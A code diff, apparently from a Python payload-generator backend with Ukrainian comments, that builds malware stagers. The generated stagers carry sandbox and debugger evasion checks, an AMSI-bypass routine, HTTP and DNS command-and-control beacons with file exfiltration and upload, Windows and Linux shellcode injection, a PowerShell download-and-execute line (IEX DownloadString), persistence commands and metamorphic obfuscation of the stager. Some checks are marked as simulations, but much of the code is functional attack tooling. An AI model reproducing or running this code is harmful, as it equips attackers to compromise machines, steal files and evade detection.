             stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
             stager_code_lines.append(f"DNS_BEACON_SUBDOMAIN_PREFIX = \"{validated_params.get('dns_beacon_subdomain_prefix')}\"")
             stager_code_lines.append(f"DNS_BEACON_INTERVAL_SEC = {random.randint(25, 55)}")
 
+        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket", "import json as json_stager_module"]) 
+        if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept": 
+            stager_code_lines.extend(["import urllib.request", "import urllib.error"]) 
 
-        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket", "import json as json_stager_module"]) # json з псевдонімом
-        if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept": # Для C2 потрібен urllib
-            stager_code_lines.extend(["import urllib.request", "import urllib.error"]) # Додаємо urllib.error для обробки помилок
-
-        # Імпорти для шеллкоду та деяких перевірок ухилення
         if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64", "windows_simple_persistence_stager"] or \
            validated_params.get('enable_evasion_checks') or validated_params.get('enable_amsi_bypass_concept') or validated_params.get('enable_disk_size_check'):
             stager_code_lines.append("import ctypes")
-            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64" or (os.name != 'nt' and validated_params.get('enable_disk_size_check')): # shutil для Linux disk check
-                 stager_code_lines.append("import shutil") # Додаємо shutil, якщо потрібен
-            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64": # mmap для Linux shellcode
-                stager_code_lines.append("import mmap as mmap_module") # mmap з псевдонімом
+            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64" or (os.name != 'nt' and validated_params.get('enable_disk_size_check')): 
+                 stager_code_lines.append("import shutil") 
+            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64": 
+                stager_code_lines.append("import mmap as mmap_module") 
         stager_code_lines.append("")
 
-        # Імена функцій для runtime (можуть бути обфусковані пізніше)
         decode_func_name_runtime = "dx_runtime"
         evasion_func_name_runtime = "ec_runtime"
         execute_func_name_runtime = "ex_runtime"
 
         stager_code_lines.extend([
-            # Функція для розшифровки даних
             f"def {decode_func_name_runtime}(b64_data, key_str):",
             "    try:",
             "        temp_decoded_bytes = base64.b64decode(b64_data.encode('utf-8'))",
@@ -1068,34 +1192,29 @@ def handle_generate_payload():
             "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
             "    return \"\".join(o_chars)",
             "",
-            # Функція для концептуальних перевірок ухилення
             f"def {evasion_func_name_runtime}():",
             "    print(\"[STAGER_EVASION] Виконання розширених концептуальних перевірок ухилення...\")",
-            "    indicators = [] # Список виявлених індикаторів",
-            # Перевірка імені користувача
+            "    indicators = [] ",
             "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
             "    try:",
             "        current_user = os.getlogin().lower()",
             "        if current_user in common_sandbox_users: indicators.append('common_username_detected')",
             "    except Exception: pass",
-            # Перевірка наявності дебагера (Windows)
             "    try:",
             "        if os.name == 'nt':",
             "            kernel32 = ctypes.windll.kernel32",
             "            if kernel32.IsDebuggerPresent() != 0:",
             "                indicators.append('debugger_present_win')",
             "    except Exception: pass",
-            # Перевірка прискорення часу
             "    try:",
             "        sleep_duration_seconds = random.uniform(1.8, 3.3)",
             "        time_before_sleep = time.monotonic()",
             "        time.sleep(sleep_duration_seconds)",
             "        time_after_sleep = time.monotonic()",
             "        elapsed_time = time_after_sleep - time_before_sleep",
-            "        if elapsed_time < (sleep_duration_seconds * 0.65): # Якщо час пройшов значно швидше",
+            "        if elapsed_time < (sleep_duration_seconds * 0.65): ",
             "            indicators.append('time_acceleration_heuristic')",
             "    except Exception: pass",
-            # Перевірка наявності файлів VM
             "    vm_files_artifacts = [",
             "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxMouse.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxGuest.sys\",",
             "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmhgfs.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmmouse.sys\",",
@@ -1104,45 +1223,39 @@ def handle_generate_payload():
             "    for vm_file_path in vm_files_artifacts:",
             "        if os.path.exists(vm_file_path):",
             "            indicators.append(f'vm_file_artifact_{os.path.basename(vm_file_path).lower().replace(\".sys\",\"\")}')",
-            "            break # Достатньо одного знайденого файлу",
-            # Перевірка імені хоста
+            "            break ",
             "    try:",
             "        hostname = socket.gethostname().lower()",
             "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\", \"lab\", \"desktop-\", \"DESKTOP-\"]",
             "        if any(keyword in hostname for keyword in suspicious_host_keywords):",
             "            indicators.append('suspicious_hostname_keyword')",
             "    except Exception: pass",
-            # Перевірка кількості ядер CPU
             "    try:",
             "        cpu_count = os.cpu_count()",
             "        if cpu_count is not None and cpu_count < 2:",
             "            indicators.append('low_cpu_core_count')",
             "    except Exception: pass",
-            # Перевірка активності миші (Windows)
             "    try:",
             "        if os.name == 'nt':",
             "            class POINT(ctypes.Structure): _fields_ = [(\"x\", ctypes.c_long), (\"y\", ctypes.c_long)]",
             "            pt1 = POINT()",
             "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))",
-            "            time.sleep(random.uniform(0.3, 0.7)) # Невелика затримка",
+            "            time.sleep(random.uniform(0.3, 0.7)) ",
             "            pt2 = POINT()",
             "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))",
-            "            if pt1.x == pt2.x and pt1.y == pt2.y:", # Якщо позиція не змінилася
+            "            if pt1.x == pt2.x and pt1.y == pt2.y: ",
             "                 indicators.append('no_mouse_activity_win')",
             "    except Exception: pass",
-            # Імітація перевірки запущених процесів (насправді не перевіряє)
             "    suspicious_processes = ['wireshark.exe', 'procmon.exe', 'procexp.exe', 'ollydbg.exe', 'x64dbg.exe', 'idag.exe', 'idaw.exe', 'fiddler.exe', 'tcpview.exe', 'autoruns.exe']",
-            "    if random.random() < 0.1: indicators.append('simulated_suspicious_process_check')", # Імовірнісна симуляція
+            "    if random.random() < 0.1: indicators.append('simulated_suspicious_process_check')", 
             "",
-            # Імітація перевірки хуків API (насправді не перевіряє)
-            "    if random.random() < 0.08: indicators.append('simulated_api_hook_check')", # Імовірнісна симуляція
+            "    if random.random() < 0.08: indicators.append('simulated_api_hook_check')", 
             "",
-            # Концептуальний обхід AMSI (симуляція патчингу)
             "    if AMSI_BYPASS_CONCEPT_APPLIED and os.name == 'nt':",
             "        print(\"[STAGER_EVASION_AMSI] Спроба концептуального обходу AMSI...\")",
             "        try:",
-            "            amsi_dll_name_b64 = 'YW1zaS5kbGw=' # amsi.dll",
-            "            amsi_scan_buffer_b64 = 'QW1zaVNjYW5CdWZmZXI=' # AmsiScanBuffer",
+            "            amsi_dll_name_b64 = 'YW1zaS5kbGw=' ",
+            "            amsi_scan_buffer_b64 = 'QW1zaVNjYW5CdWZmZXI=' ",
             "            amsi_dll_name = base64.b64decode(amsi_dll_name_b64).decode('utf-8')",
             "            amsi_scan_buffer_name = base64.b64decode(amsi_scan_buffer_b64).decode('utf-8')",
             "",
@@ -1155,22 +1268,21 @@ def handle_generate_payload():
             "                if not amsi_scan_buffer_addr:",
             "                    print(f\"[STAGER_EVASION_AMSI_WARN] Не вдалося отримати адресу {{amsi_scan_buffer_name}}: {{ctypes.get_last_error()}}\")",
             "                else:",
-            "                    patch_code_hex = 'C3' # RET інструкція (0xC3)",
+            "                    patch_code_hex = 'C3' ",
             "                    patch_byte = bytes.fromhex(patch_code_hex)[0]",
-            "                    original_byte = (ctypes.c_char).from_address(amsi_scan_buffer_addr).value # Читаємо оригінальний байт",
+            "                    original_byte = (ctypes.c_char).from_address(amsi_scan_buffer_addr).value ",
             "                    print(f\"[STAGER_EVASION_AMSI_SIM] Концептуальний 'патчинг' {{amsi_scan_buffer_name}} за адресою {{hex(amsi_scan_buffer_addr)}}.\")",
             "                    print(f\"  Оригінальний байт: {{hex(ord(original_byte))}}, 'патч': {{hex(patch_byte)}} (симуляція, не застосовано).\")",
-            "                    indicators.append('amsi_bypass_attempted_sim')", # Додаємо індикатор спроби
+            "                    indicators.append('amsi_bypass_attempted_sim')", 
             "            if amsi_handle : kernel32.FreeLibrary(amsi_handle)",
             "        except Exception as e_amsi:",
             "            print(f\"[STAGER_EVASION_AMSI_ERROR] Помилка під час симуляції обходу AMSI: {{e_amsi}}\")",
             "            indicators.append('amsi_bypass_exception_sim')",
             "",
-            # Концептуальна перевірка розміру диска
             "    if DISK_SIZE_CHECK_APPLIED:",
             "        print(\"[STAGER_EVASION_DISK] Концептуальна перевірка розміру диска...\")",
             "        try:",
-            "            min_disk_size_gb_threshold = 50 # Мінімальний поріг розміру диска в ГБ",
+            "            min_disk_size_gb_threshold = 50 ",
             "            total_bytes = 0",
             "            if os.name == 'nt':",
             "                free_bytes_available_to_caller = ctypes.c_ulonglong(0)",
@@ -1185,11 +1297,11 @@ def handle_generate_payload():
             "                    total_bytes = total_number_of_bytes.value",
             "                else:",
             "                    print(f\"[STAGER_EVASION_DISK_WARN_WIN] Не вдалося отримати розмір диска C:: {{ctypes.WinError()}}\")",
-            "            else: # Для Linux/macOS",
+            "            else: ",
             "                try:",
-            "                    disk_usage_stats = shutil.disk_usage('/') # Потрібен імпорт shutil",
+            "                    disk_usage_stats = shutil.disk_usage('/') ",
             "                    total_bytes = disk_usage_stats.total",
-            "                except NameError: # Якщо shutil не було імпортовано (наприклад, для Windows без цієї перевірки)",
+            "                except NameError: ",
             "                    print(\"[STAGER_EVASION_DISK_WARN_POSIX] Модуль shutil не імпортовано для перевірки диска.\")",
             "                except Exception as e_disk_posix:",
             "                    print(f\"[STAGER_EVASION_DISK_WARN_POSIX] Помилка отримання розміру диска /: {{e_disk_posix}}\")",
@@ -1207,11 +1319,10 @@ def handle_generate_payload():
             "",
             "    if indicators:",
             "        print(f\"[STAGER_EVASION] Виявлено індикатори аналітичного середовища: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")",
-            "        return True # Повертаємо True, якщо виявлено індикатори",
+            "        return True ",
             "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (концептуально).\")",
-            "    return False # Повертаємо False, якщо індикаторів не виявлено",
+            "    return False ",
             "",
-            # Функція для виконання основної логіки пейлоада
             f"def {execute_func_name_runtime}(payload_params_json, arch_type):",
             "    try:",
             "        payload_params = json_stager_module.loads(payload_params_json)",
@@ -1219,10 +1330,9 @@ def handle_generate_payload():
             "        print(f\"[PAYLOAD_ERROR] Помилка розпаковки параметрів пейлоада: {{e_json_parse}}\")",
             "        return",
             "    print(f\"[PAYLOAD ({{arch_type}})] Ініціалізація логіки пейлоада з параметрами: {{payload_params}}\")",
-            # Логіка для demo_c2_beacon_payload
             "    if arch_type == 'demo_c2_beacon_payload':",
             "        beacon_url = payload_params.get('c2_url')",
-            "        implant_data = {", # Дані, що надсилаються з маячком
+            "        implant_data = {", 
             "            'implant_id': STAGER_IMPLANT_ID,",
             "            'hostname': socket.gethostname(),",
             "            'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown_user',",
@@ -1230,18 +1340,17 @@ def handle_generate_payload():
             "            'pid': os.getpid(),",
             "            'beacon_interval_sec': BEACON_INTERVAL_SEC",
             "        }",
-            "        last_task_result_package = None # Для збереження результату останнього завдання",
+            "        last_task_result_package = None ",
             "        exfil_state = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
             "",
             "        while True:",
             "            current_beacon_payload = implant_data.copy()",
-            "            if last_task_result_package:", # Додаємо результат попереднього завдання, якщо є
+            "            if last_task_result_package:", 
             "                current_beacon_payload['last_task_id'] = last_task_result_package.get('task_id')",
             "                current_beacon_payload['last_task_result'] = last_task_result_package.get('result')",
             "                current_beacon_payload['task_success'] = last_task_result_package.get('success', False)",
-            "                last_task_result_package = None # Очищуємо після відправки",
+            "                last_task_result_package = None ",
             "",
-            # Логіка ексфільтрації файлів частинами
             "            if exfil_state['active'] and exfil_state['file_handle']:",
             "                try:",
             "                    chunk_data = exfil_state['file_handle'].read(exfil_state['chunk_size'])",
@@ -1257,13 +1366,13 @@ def handle_generate_payload():
             "                        current_beacon_payload['file_exfil_chunk'] = exfil_result",
             "                        print(f\"[PAYLOAD_EXFIL] Підготовлено чанк #{{exfil_state['current_chunk']}} для {{exfil_state['file_path']}}\")",
             "                        exfil_state['current_chunk'] += 1",
-            "                    else: # Кінець файлу",
+            "                    else: ",
             "                        exfil_state['file_handle'].close()",
             "                        exfil_result = {",
             "                            'file_path': exfil_state['file_path'],",
-            "                            'chunk_num': exfil_state['current_chunk'] -1, ", # Останній успішний чанк
+            "                            'chunk_num': exfil_state['current_chunk'] -1, ", 
             "                            'total_chunks': exfil_state['total_chunks'],",
-            "                            'data_b64': '',", # Порожні дані для фінального чанка
+            "                            'data_b64': '',", 
             "                            'is_final': True",
             "                        }",
             "                        current_beacon_payload['file_exfil_chunk'] = exfil_result",
@@ -1283,12 +1392,12 @@ def handle_generate_payload():
             "                    response_data_raw = response.read().decode('utf-8')",
             "                    print(f\"[PAYLOAD_BEACON] Відповідь C2 (статус {{response.status}}): {{response_data_raw[:200]}}...\")",
             "                    c2_response_parsed = json_stager_module.loads(response_data_raw)",
-            "                    next_task = c2_response_parsed.get('c2_response', {}).get('next_task')", # Отримуємо завдання від C2
+            "                    next_task = c2_response_parsed.get('c2_response', {}).get('next_task')", 
             "",
             "                if next_task and next_task.get('task_type'):",
             "                    task_id = next_task.get('task_id')",
             "                    task_type = next_task.get('task_type')",
-            "                    task_params_str = next_task.get('task_params', '') # Параметри можуть бути рядком або словником (для upload)",
+            "                    task_params_str = next_task.get('task_params', '') ",
             "                    print(f\"[PAYLOAD_TASK] Отримано завдання ID: {{task_id}}, Тип: {{task_type}}, Парам: '{{str(task_params_str)[:100]}}...' \")",
             "                    task_output = ''",
             "                    task_success = False",
@@ -1324,7 +1433,7 @@ def handle_generate_payload():
             "                                task_output = f'Помилка ексфільтрації: Файл {{file_to_exfil}} не знайдено або не є файлом.'",
             "                                task_success = False",
             "                        elif task_type == 'upload_file_b64':",
-            "                            upload_params = task_params_str # Тут task_params_str - це словник",
+            "                            upload_params = task_params_str ",
             "                            remote_upload_path = upload_params.get('path')",
             "                            file_content_b64 = upload_params.get('content_b64')",
             "                            if remote_upload_path and file_content_b64:",
@@ -1350,7 +1459,7 @@ def handle_generate_payload():
             "                        task_success = False",
             "                        print(f\"[PAYLOAD_TASK_ERROR] {{task_output}}\")",
             "                    last_task_result_package = {'task_id': task_id, 'result': task_output, 'success': task_success}",
-            "                    continue # Відразу відправляємо маячок з результатом, не чекаючи інтервалу",
+            "                    continue ",
             "                else:",
             "                    print(f\"[PAYLOAD_BEACON] Нових завдань від C2 не отримано.\")",
             "                    last_task_result_package = None",
@@ -1365,29 +1474,27 @@ def handle_generate_payload():
             "            except Exception as e_beacon_loop:",
             "                print(f\"[PAYLOAD_BEACON_ERROR] Загальна помилка в циклі маячка: {{e_beacon_loop}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
             "            ",
-            # Затримка перед наступним маячком, якщо не було завдання або ексфільтрації
             "            if not next_task and not exfil_state['active']:",
             "                print(f\"[PAYLOAD_BEACON] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
             "                time.sleep(BEACON_INTERVAL_SEC)",
-            "            elif exfil_state['active']:", # Якщо йде ексфільтрація, робимо меншу затримку
-            "                 time.sleep(random.uniform(0.1, 0.5))", # Невелика затримка між відправкою чанків
-            # Логіка для dns_beacon_c2_concept
+            "            elif exfil_state['active']:", 
+            "                 time.sleep(random.uniform(0.1, 0.5))", 
             "    elif arch_type == 'dns_beacon_c2_concept':",
             "        c2_zone = payload_params.get('dns_zone')",
-            "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX", # Використовуємо глобальну змінну стейджера
+            "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX", 
             "        implant_id_dns = STAGER_IMPLANT_ID",
             "        beacon_interval = DNS_BEACON_INTERVAL_SEC",
             "        last_task_result_dns = None",
             "",
             "        def encode_data_for_dns(data_dict):",
             "            try:",
-            "                json_data = json_stager_module.dumps(data_dict, separators=(',', ':')) # Компактний JSON",
-            "                encoded_full = base64.b32encode(json_data.encode('utf-8')).decode('utf-8').rstrip('=').lower() # Base32 для DNS-безпечних символів",
-            "                chunk_size = 60 # Максимальна довжина мітки DNS (63, мінус для індексів та іншого)",
+            "                json_data = json_stager_module.dumps(data_dict, separators=(',', ':')) ",
+            "                encoded_full = base64.b32encode(json_data.encode('utf-8')).decode('utf-8').rstrip('=').lower() ",
+            "                chunk_size = 60 ",
             "                return [encoded_full[i:i + chunk_size] for i in range(0, len(encoded_full), chunk_size)]",
             "            except Exception as e_enc:",
             "                print(f\"[DNS_BEACON_ERROR] Помилка кодування даних: {{e_enc}}\")",
-            "                return [\"encodeerror\"]", # Повертаємо маркер помилки
+            "                return [\"encodeerror\"]", 
             "",
             "        print(f\"[PAYLOAD_DNS_BEACON] Ініціалізація DNS C2. Зона: {{c2_zone}}, Префікс: {{dns_prefix}}, ID: {{implant_id_dns}}\")",
             "        while True:",
@@ -1402,7 +1509,7 @@ def handle_generate_payload():
             "            for chunk_idx, data_chunk in enumerate(encoded_data_chunks):",
             "                query_hostname = f\"{{data_chunk}}.p{{chunk_idx}}.{{implant_id_dns.lower().replace('-', '')[:10]}}.{{dns_prefix}}.{{c2_zone}}\"",
             "                print(f\"[PAYLOAD_DNS_BEACON] Симуляція DNS-запиту (тип A/TXT) для: {{query_hostname}}\")",
-            "                sim_c2_dns_url = f'http://localhost:5000/api/c2/dns_resolver_sim?q={{query_hostname}}&id={{implant_id_dns}}' # URL для симулятора",
+            "                sim_c2_dns_url = f'http://localhost:5000/api/c2/dns_resolver_sim?q={{query_hostname}}&id={{implant_id_dns}}' ",
             "                try:",
             "                    print(f\"[PAYLOAD_DNS_BEACON] Симуляція запиту до DNS Resolver (через HTTP): {{sim_c2_dns_url}}\")",
             "                    req = urllib.request.Request(sim_c2_dns_url, headers={'User-Agent': 'SyntaxDNSBeaconClient/1.0'})",
@@ -1416,39 +1523,36 @@ def handle_generate_payload():
             "                            decoded_task_json_str = decoded_task_json_bytes.decode('utf-8')",
             "                            next_task_dns = json_stager_module.loads(decoded_task_json_str)",
             "                            print(f\"[PAYLOAD_DNS_BEACON] Розкодовано завдання з DNS TXT: {{next_task_dns}}\")",
-            "                        elif dns_response_parsed.get('success') and dns_response_parsed.get('task_data'): # Для прямої передачі завдання (якщо симулятор так налаштований)",
+            "                        elif dns_response_parsed.get('success') and dns_response_parsed.get('task_data'): ",
             "                            next_task_dns = dns_response_parsed.get('task_data')",
             "                except Exception as e_dns_sim_http:",
             "                    print(f\"[PAYLOAD_DNS_BEACON_ERROR] Помилка HTTP-запиту до симулятора DNS: {{e_dns_sim_http}}\")",
-            "                if next_task_dns: break # Якщо завдання отримано, виходимо з циклу чанків",
+            "                if next_task_dns: break ",
             "",
             "            if next_task_dns and next_task_dns.get('task_type'):",
             "                task_id = next_task_dns.get('task_id')",
             "                task_type = next_task_dns.get('task_type')",
             "                task_params_str = next_task_dns.get('task_params', '')",
             "                print(f\"[PAYLOAD_DNS_TASK] Отримано завдання (через DNS) ID: {{task_id}}, Тип: {{task_type}}, Парам: '{{task_params_str}}'\")",
-            "                task_output = f'DNS_TASK_SIM_RESULT: {{task_type}} ({{task_params_str}}) - OK'", # Симуляція виконання
+            "                task_output = f'DNS_TASK_SIM_RESULT: {{task_type}} ({{task_params_str}}) - OK'", 
             "                last_task_result_dns = {'task_id': task_id, 'result_summary': task_output[:50]}",
-            "                time.sleep(random.uniform(0.5, 1.0)) # Невелика затримка після \\\"виконання\\\"",
+            "                time.sleep(random.uniform(0.5, 1.0)) ",
             "            else:",
             "                print(f\"[PAYLOAD_DNS_BEACON] Нових завдань через DNS не отримано.\")",
             "                last_task_result_dns = None",
             "            ",
             "            print(f\"[PAYLOAD_DNS_BEACON] Очікування {{beacon_interval}} секунд до наступного DNS маячка...\")",
             "            time.sleep(beacon_interval)",
-            # Логіка для demo_file_lister_payload
             "    elif arch_type == 'demo_file_lister_payload':",
             "        try:",
             "            target_dir = payload_params.get('directory', '.')",
-            "            target_dir = target_dir if target_dir and target_dir.strip() != '.' else os.getcwd() # Якщо '.' або порожньо, беремо поточну директорію",
+            "            target_dir = target_dir if target_dir and target_dir.strip() != '.' else os.getcwd() ",
             "            files = os.listdir(target_dir)",
             "            print(f\"[PAYLOAD ({{arch_type}})] Перелік директорії '{{target_dir}}': {{files[:5]}} {'...' if len(files) > 5 else ''}\")",
             "        except Exception as e_list:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка переліку директорії '{{payload_params.get('directory')}}': {{e_list}}\")",
-            # Логіка для demo_echo_payload
             "    elif arch_type == 'demo_echo_payload':",
             "        print(f\"[PAYLOAD ({{arch_type}})] Відлуння: {{payload_params.get('message')}}\")",
-            # Логіка для reverse_shell_tcp_shellcode_windows_x64
             "    elif arch_type == 'reverse_shell_tcp_shellcode_windows_x64':",
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Windows x64...\")",
             "        try:",
@@ -1476,15 +1580,11 @@ def handle_generate_payload():
             "            handle = kernel32.CreateThread(None, 0, ctypes.c_void_p(ptr), None, 0, ctypes.byref(thread_id))",
             "            if not handle:",
             "                print(f\"[PAYLOAD_ERROR] Помилка CreateThread: {{ctypes.WinError()}}\")",
-            "                kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x00008000) # MEM_RELEASE",
+            "                kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x00008000) ",
             "                return",
             "            print(f\"[PAYLOAD_SUCCESS] Шеллкод запущено в потоці ID: {{thread_id.value}}. Handle: {{handle}}.\")",
-            "            # kernel32.WaitForSingleObject(handle, -1) # Опціонально: чекати завершення потоку",
-            "            # kernel32.CloseHandle(handle) # Опціонально: закрити handle потоку",
-            "            # kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x00008000) # Опціонально: звільнити пам'ять, якщо потік короткоживучий",
             "        except Exception as e_shellcode_win:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Windows: {{e_shellcode_win}}\")",
-            # Логіка для reverse_shell_tcp_shellcode_linux_x64
             "    elif arch_type == 'reverse_shell_tcp_shellcode_linux_x64':",
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Linux x64...\")",
             "        try:",
@@ -1494,7 +1594,7 @@ def handle_generate_payload():
             "                return",
             "            shellcode_bytes = bytes.fromhex(shellcode_hex)",
             "            print(f\"[PAYLOAD_INFO] Розмір шеллкоду: {{len(shellcode_bytes)}} байт.\")",
-            "            libc = ctypes.CDLL(None) # Завантажуємо libc",
+            "            libc = ctypes.CDLL(None) ",
             "            PROT_READ = 0x1",
             "            PROT_WRITE = 0x2",
             "            PROT_EXEC = 0x4",
@@ -1505,7 +1605,7 @@ def handle_generate_payload():
             "            mmap_syscall.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]",
             "            print(\"[PAYLOAD_INFO] Виділення пам'яті через mmap...\")",
             "            mem_ptr = mmap_syscall(None, len(shellcode_bytes), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)",
-            "            if mem_ptr == -1 or mem_ptr == 0: # mmap повертає (void*)-1 у випадку помилки",
+            "            if mem_ptr == -1 or mem_ptr == 0: ",
             "                err_no = ctypes.get_errno()",
             "                print(f\"[PAYLOAD_ERROR] Помилка mmap: {{os.strerror(err_no)}} (errno: {{err_no}})\")",
             "                return",
@@ -1513,20 +1613,18 @@ def handle_generate_payload():
             "            ctypes.memmove(mem_ptr, shellcode_bytes, len(shellcode_bytes))",
             "            print(\"[PAYLOAD_INFO] Шеллкод скопійовано в пам'ять.\")",
             "            print(\"[PAYLOAD_INFO] Створення вказівника на функцію та виклик шеллкоду...\")",
-            "            shellcode_func_type = ctypes.CFUNCTYPE(None) # Тип функції без аргументів та повернення",
+            "            shellcode_func_type = ctypes.CFUNCTYPE(None) ",
             "            shellcode_function = shellcode_func_type(mem_ptr)",
-            "            shellcode_function() # Виклик шеллкоду",
+            "            shellcode_function() ",
             "            print(\"[PAYLOAD_SUCCESS] Шеллкод для Linux x64 (начебто) виконано.\")",
-            "            # libc.munmap(mem_ptr, len(shellcode_bytes)) # Опціонально: звільнити пам'ять",
             "        except Exception as e_shellcode_linux:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Linux: {{e_shellcode_linux}}\")",
-            # Логіка для powershell_downloader_stager
             "    elif arch_type == 'powershell_downloader_stager':",
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба завантаження та виконання PowerShell скрипта з URL: {{payload_params.get('ps_url')}}\")",
             "        try:",
             "            ps_command_to_run = f\"IEX (New-Object Net.WebClient).DownloadString('{payload_params.get('ps_url')}')\"",
             "            full_command = ['powershell.exe']",
-            "            if POWERSHELL_EXEC_ARGS:", # Використовуємо глобальну змінну стейджера
+            "            if POWERSHELL_EXEC_ARGS:", 
             "                full_command.extend(POWERSHELL_EXEC_ARGS.split())",
             "            full_command.extend(['-Command', ps_command_to_run])",
             "            print(f\"[PAYLOAD_INFO] Виконання команди: {{' '.join(full_command)}}\")",
@@ -1537,7 +1635,6 @@ def handle_generate_payload():
             "                print(f\"[PAYLOAD_ERROR] Помилка виконання PowerShell скрипта (код: {{result.returncode}}). STDERR: {{result.stderr}}\")",
             "        except Exception as e_ps_download:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час завантаження/виконання PowerShell: {{e_ps_download}}\")",
-            # Логіка для windows_simple_persistence_stager
             "    elif arch_type == 'windows_simple_persistence_stager':",
             "        method = payload_params.get('persistence_method')",
             "        command = payload_params.get('command_to_persist')",
@@ -1561,7 +1658,7 @@ def handle_generate_payload():
             "                return",
             "",
             "            print(f\"[PAYLOAD_PERSISTENCE_EXEC] Виконання команди: {{' '.join(persist_cmd_parts)}}\")",
-            "            proc = subprocess.run(persist_cmd_parts, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore')", # cp866 для виводу консолі Windows
+            "            proc = subprocess.run(persist_cmd_parts, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore')", 
             "            if proc.returncode == 0:",
             "                print(f\"[PAYLOAD_PERSISTENCE_SUCCESS] {{success_msg}}\")",
             "                print(f\"  STDOUT: {{proc.stdout}}\")",
@@ -1572,11 +1669,10 @@ def handle_generate_payload():
             "        except Exception as e_persist:",
             "            print(f\"[PAYLOAD_PERSISTENCE_FATAL_ERROR] Непередбачена помилка: {{e_persist}}\")",
             "",
-            # Основний блок виконання стейджера
             "if __name__ == '__main__':",
             "    print(f\"[STAGER] Стейджер для '{archetype_name}' запускається...\")",
             "    sandbox_detected_flag = False",
-            "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED or DISK_SIZE_CHECK_APPLIED:", # Викликаємо, якщо хоча б одна опція увімкнена
+            "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED or DISK_SIZE_CHECK_APPLIED:", 
             f"        sandbox_detected_flag = {evasion_func_name_runtime}()",
             "    if not sandbox_detected_flag:",
             f"        decoded_payload_parameters_json = {decode_func_name_runtime}(OBF_DATA_B64, OBFUSCATION_KEY_EMBEDDED)",
@@ -1593,28 +1689,20 @@ def handle_generate_payload():
         if validated_params.get('enable_stager_metamorphism', False):
             log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
             stager_code_raw_for_metamorph = stager_code_raw
-            # 1. Обфускація рядкових літералів
             stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code(stager_code_raw_for_metamorph, key, log_messages)
-            # 2. Застосування CFO (Control Flow Obfuscation)
             stager_code_raw_list_for_cfo = stager_code_raw_for_metamorph.splitlines()
             stager_code_raw_for_metamorph = apply_advanced_cfo_be(stager_code_raw_list_for_cfo, log_messages)
-            # 3. Рандомізація імен ключових функцій (після всіх інших трансформацій)
-            # Знаходимо імена функцій, які були визначені (напр. unveil_xxxx, dx_runtime)
-            # та замінюємо їх на нові випадкові імена.
-            # Для простоти, ми знаємо, що це decode_func_name_runtime, evasion_func_name_runtime, execute_func_name_runtime
-            # та функція з obfuscate_string_literals_in_python_code.
-            # Шукаємо визначення функції unveil_... (з obfuscate_string_literals_in_python_code)
             unveil_match = re.search(r"def\s+(unveil_\w+)\(", stager_code_raw_for_metamorph)
             final_unveil_name = unveil_match.group(1) if unveil_match else None
 
-            final_decode_name = generate_random_var_name(prefix="unveil_") # Нове ім'я для dx_runtime
-            final_evasion_name = generate_random_var_name(prefix="audit_") # Нове ім'я для ec_runtime
-            final_execute_name = generate_random_var_name(prefix="dispatch_") # Нове ім'я для ex_runtime
+            final_decode_name = generate_random_var_name(prefix="unveil_") 
+            final_evasion_name = generate_random_var_name(prefix="audit_") 
+            final_execute_name = generate_random_var_name(prefix="dispatch_") 
 
